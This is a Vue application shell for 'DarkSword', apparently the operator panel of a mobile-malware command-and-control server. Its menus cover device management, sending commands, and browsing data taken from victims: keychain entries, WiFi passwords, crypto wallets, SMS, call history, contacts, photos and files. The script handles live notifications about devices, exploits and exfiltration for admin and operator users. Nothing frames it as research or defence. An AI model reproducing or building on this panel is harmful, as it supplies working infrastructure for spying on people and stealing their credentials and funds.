<template>
  <el-container class="app-container">
    <el-aside v-if="$route.meta.requiresAuth" width="220px" class="sidebar">
      <div class="logo">
        <h2>DarkSword</h2>
        <p>C2 Control Panel</p>
      </div>
      <el-menu :default-active="activeMenu" class="sidebar-menu" @select="handleMenuSelect">
        <el-menu-item index="/">
          <el-icon><Monitor /></el-icon>
          <span>Dashboard</span>
        </el-menu-item>
        <el-menu-item index="/devices">
          <el-icon><Phone /></el-icon>
          <span>Devices</span>
        </el-menu-item>
        <el-menu-item index="/commands">
          <el-icon><Monitor /></el-icon>
          <span>Commands</span>
        </el-menu-item>
        <el-sub-menu index="/exfil">
          <template #title>
            <el-icon><FolderOpened /></el-icon>
            <span>Exfil Data</span>
          </template>
          <el-menu-item index="/exfil">All Data</el-menu-item>
          <el-menu-item index="/wallets">Wallets</el-menu-item>
          <el-menu-item index="/exfil/keychain">Keychain Viewer</el-menu-item>
          <el-menu-item index="/exfil/wifi">WiFi Passwords</el-menu-item>
          <el-menu-item index="/exfil/contacts">Contacts</el-menu-item>
          <el-menu-item index="/exfil/sms">SMS Records</el-menu-item>
          <el-menu-item index="/exfil/calls">Call History</el-menu-item>
          <el-menu-item index="/exfil/photos">Photos</el-menu-item>
          <el-menu-item index="/exfil/files">File Browser</el-menu-item>
        </el-sub-menu>
        <el-menu-item index="/logs">
          <el-icon><Document /></el-icon>
          <span>Access Logs</span>
        </el-menu-item>
        <el-sub-menu index="/system">
          <template #title>
            <el-icon><Setting /></el-icon>
            <span>System</span>
          </template>
          <el-menu-item index="/system/settings">System Settings</el-menu-item>
          <el-menu-item index="/system/audit">Audit Log</el-menu-item>
          <el-menu-item index="/system/notifications">Notifications</el-menu-item>
        </el-sub-menu>
        <el-menu-item v-if="user?.role === 'admin'" index="/users">
          <el-icon><User /></el-icon>
          <span>User Management</span>
        </el-menu-item>
      </el-menu>
    </el-aside>
    <el-container>
      <el-header v-if="$route.meta.requiresAuth" class="header">
        <div class="header-left">
          <el-button @click="toggleSidebar" class="toggle-btn">
            <el-icon><Menu /></el-icon>
          </el-button>
        </div>
        <div class="header-right">
          <el-dropdown trigger="click">
            <span class="user-info">
              <el-icon><User /></el-icon>
              <span>{{ user?.username }}</span>
              <el-icon><ArrowDown /></el-icon>
            </span>
            <template #dropdown>
              <el-dropdown-menu>
                <el-dropdown-item disabled>Role: {{ user?.role === 'admin' ? 'Admin' : 'Operator' }}</el-dropdown-item>
                <el-dropdown-item divided @click="handleLogout">
                  <el-icon><SwitchButton /></el-icon>
                  <span>Logout</span>
                </el-dropdown-item>
              </el-dropdown-menu>
            </template>
          </el-dropdown>
        </div>
      </el-header>
      <el-main class="main-content">
        <router-view />
      </el-main>
    </el-container>
  </el-container>
</template>

<script setup>
import { computed, onMounted, onBeforeUnmount, watch } from 'vue'
import { useRouter } from 'vue-router'
import { ElNotification } from 'element-plus'
import { useAuthStore } from './stores/auth'
import {
  Monitor, Document, Phone, FolderOpened, User,
  Menu, ArrowDown, SwitchButton, Setting
} from '@element-plus/icons-vue'

const LS_NOTIFY_KEY = 'notify_enabled'
const LS_PAGE_TOAST_KEY = 'page_toast_enabled'

const router = useRouter()
const authStore = useAuthStore()
const user = computed(() => authStore.user)

let sseEventSource = null
let sseRetryTimer = null
let visibilityListenerBound = false

// ========== Page floating notification (bottom-right ElNotification) + dedup ==========
const recentPageNotifications = new Map()

function trimUuid(uuid) {
  if (!uuid) return ''
  if (uuid.length <= 10) return uuid
  return uuid.slice(0, 10) + '...'
}

function dedupKeyForNotification(payload) {
  if (!payload) return null
  if (typeof payload.id === 'number') return 'id:' + payload.id
  const title = (payload.title || '').toString()
  const desc = (payload.message || payload.description || '').toString()
  const dev = (payload.related_device_uuid || '').toString()
  if (!title && !desc) return null
  let h = 0
  const s = title + '|' + desc + '|' + dev + '|' + (payload.category || payload.type || '')
  for (let i = 0; i < s.length; i++) {
    h = ((h << 5) - h + s.charCodeAt(i)) | 0
  }
  return 'hash:' + h
}

function isPageNotificationDuplicate(payload) {
  const key = dedupKeyForNotification(payload)
  if (!key) return false
  const now = Date.now()
  const prev = recentPageNotifications.get(key)
  if (prev && (now - prev) < 120000) return true
  recentPageNotifications.set(key, now)
  if (recentPageNotifications.size > 200) {
    const cutoff = now - 180000
    for (const [k, t] of Array.from(recentPageNotifications.entries())) {
      if (t < cutoff) recentPageNotifications.delete(k)
    }
  }
  return false
}

function mapNotificationToType(payload) {
  const cat = String(payload.type || payload.category || 'info').toLowerCase()
  if (cat.includes('error') || cat.includes('alert') || cat.includes('critical') || cat.includes('danger')) return 'error'
  if (cat.includes('warn') || cat.includes('exploit') || cat.includes('security')) return 'warning'
  if (cat.includes('success') || cat.includes('online') || cat.includes('back') || cat.includes('ok')) return 'success'
  if (cat.includes('device')) return 'warning'
  if (cat.includes('exfil')) return 'warning'
  return 'info'
}

function triggerPageFloatingNotification(payload) {
  if (!payload) return
  const toastEnabled = localStorage.getItem(LS_PAGE_TOAST_KEY)
  if (toastEnabled === 'false') return
  if (isPageNotificationDuplicate(payload)) return

  const title = payload.title || 'DarkSword Notification'
  const rawBody = (payload.description || payload.message || '').toString()
  const body = rawBody
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/\n/g, '<br>')
  const device = payload.related_device_uuid
  const deviceHtml = device
    ? `<div style="margin-top:6px;font-size:12px;color:#909399;">Device: <code style="background:#f4f4f5;padding:1px 6px;border-radius:4px;">${trimUuid(device)}</code></div>`
    : ''
  const duration = Math.max(5000, Math.min(15000, rawBody.length * 22 + 5000))

  try {
    ElNotification({
      title: title,
      message: body + deviceHtml,
      type: mapNotificationToType(payload),
      dangerouslyUseHTMLString: true,
      position: 'bottom-right',
      duration: duration,
      offset: 24,
      showClose: true,
      customClass: 'darksword-toast darksword-toast-' + (payload.type || payload.category || 'info'),
      onClick: () => {
        try {
          if (payload.related_device_uuid) {
            router.push('/devices').catch(() => {})
          } else {
            router.push('/system/notifications').catch(() => {})
          }
          window.focus()
        } catch (_) {}
      },
    })
  } catch (err) {
    console.warn('ElNotification failed:', err)
  }
}

// ========== Notification field mapping + browser system notifications ==========
function mapSseToNotification(evtData) {
  if (!evtData) return evtData
  return {
    id: evtData.id || null,
    title: evtData.title || '',
    description: evtData.description || evtData.message || '',
    type: evtData.type || evtData.category || 'info',
    read: false,
    created_at: evtData.created_at || evtData.timestamp || new Date().toISOString(),
    related_device_uuid: evtData.related_device_uuid || null,
  }
}

function triggerBrowserNotification(payload) {
  const enabled = localStorage.getItem(LS_NOTIFY_KEY) === 'true'
  if (!enabled) return
  if (!('Notification' in window)) return
  if (Notification.permission !== 'granted') return
  try {
    const n = new Notification(payload.title || 'DarkSword Notification', {
      body: (payload.description || payload.message || '').replace(/\n/g, '  ').slice(0, 200),
      tag: 'darksword-' + (payload.related_device_uuid || ('evt-' + Date.now())),
      icon: '/favicon.ico'
    })
    n.onclick = () => {
      window.focus()
      if (payload.related_device_uuid) {
        router.push('/devices').catch(() => {})
      } else {
        router.push('/system/notifications').catch(() => {})
      }
    }
    setTimeout(() => n && n.close && n.close(), 6000)
  } catch (_) {}
}

function dispatchInAppNotification(evtData) {
  const mapped = mapSseToNotification(evtData)
  window.dispatchEvent(new CustomEvent('darksword:notification', { detail: mapped }))
}

// ========== SSE connection ==========
function closeSse() {
  if (sseRetryTimer) {
    clearTimeout(sseRetryTimer)
    sseRetryTimer = null
  }
  if (sseEventSource) {
    try { sseEventSource.close() } catch (_) {}
    sseEventSource = null
  }
}

function setupSse() {
  closeSse()
  const token = localStorage.getItem('token')
  if (!token) return
  const url = `/api/notifications/stream?token=${encodeURIComponent(token)}`
  try {
    sseEventSource = new EventSource(url, { withCredentials: true })
  } catch (err) {
    console.warn('EventSource creation failed:', err)
    scheduleSseReconnect()
    return
  }

  sseEventSource.addEventListener('connected', () => {
    if (sseRetryTimer) { clearTimeout(sseRetryTimer); sseRetryTimer = null }
  })

  sseEventSource.addEventListener('notification', (e) => {
    try {
      const data = JSON.parse(e.data)
      dispatchInAppNotification(data)
      triggerPageFloatingNotification(data)
      triggerBrowserNotification(data)
    } catch (err) {
      console.warn('Failed to parse SSE notification:', err)
    }
  })

  sseEventSource.addEventListener('heartbeat', () => {})

  sseEventSource.onerror = () => {
    closeSse()
    scheduleSseReconnect()
  }
}

function scheduleSseReconnect() {
  if (sseRetryTimer) return
  sseRetryTimer = setTimeout(() => {
    sseRetryTimer = null
    if (authStore.token || localStorage.getItem('token')) {
      setupSse()
    }
  }, 5000)
}

function bindVisibilityListener() {
  if (visibilityListenerBound) return
  visibilityListenerBound = true
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible' && (authStore.token || localStorage.getItem('token'))) {
      if (!sseEventSource) setupSse()
    }
  })
}

// ========== Menu & lifecycle ==========
const activeMenu = computed(() => {
  const path = router.currentRoute.value.path
  if (path.startsWith('/commands')) return '/commands'
  if (path.startsWith('/exfil')) return '/exfil'
  if (path.startsWith('/system')) return '/system'
  return path
})

function toggleSidebar() {
}

function handleMenuSelect(index) {
  router.push(index).catch(() => {})
}

function handleLogout() {
  authStore.logout()
  router.push('/login').catch(() => {})
}

onMounted(() => {
  if (authStore.token || localStorage.getItem('token')) {
    setupSse()
  }
  bindVisibilityListener()
})

onBeforeUnmount(() => {
  closeSse()
  recentPageNotifications.clear()
})

watch(
  () => authStore.token,
  (newToken) => {
    if (newToken) {
      if (!sseEventSource) setupSse()
    } else {
      closeSse()
    }
  }
)
</script>

<style scoped>
.app-container {
  height: 100vh;
}

.sidebar {
  background: #1a1a2e;
  color: #fff;
}

.logo {
  padding: 20px;
  text-align: center;
  border-bottom: 1px solid #333;
}

.logo h2 {
  margin: 0;
  font-size: 20px;
  font-weight: bold;
}

.logo p {
  margin: 5px 0 0;
  font-size: 12px;
  color: #888;
}

.sidebar-menu {
  border-right: none;
}

.header {
  background: #fff;
  border-bottom: 1px solid #e6e6e6;
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 0 20px;
}

.toggle-btn {
  background: transparent;
  border: none;
}

.user-info {
  display: flex;
  align-items: center;
  gap: 8px;
}

.main-content {
  padding: 20px;
  background: #f5f5f5;
}
</style>

<style>
/* Floating notification card global styles (penetrates scoped) */
.darksword-toast {
  max-width: 420px !important;
  box-shadow: 0 10px 24px -8px rgba(0, 0, 0, 0.18), 0 2px 6px rgba(0, 0, 0, 0.06) !important;
  border-radius: 10px !important;
}
.darksword-toast .el-notification__content {
  cursor: pointer;
}
.darksword-toast code {
  font-family: ui-monospace, SFMono-Regular, Consolas, Menlo, monospace;
}
</style>
